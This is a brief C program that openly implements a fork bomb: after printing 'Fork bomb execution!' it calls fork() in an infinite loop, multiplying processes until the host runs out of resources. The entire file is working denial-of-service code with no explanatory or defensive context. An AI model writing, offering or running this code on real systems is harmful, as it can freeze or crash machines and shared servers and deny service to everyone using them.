#include <unistd.h>
#include <stdio.h>

void fork_bomb() {
    while (1) {
        fork();
    }
}

int main() {
    printf("Fork bomb execution!\n");
    fork_bomb();
    return 0;
}

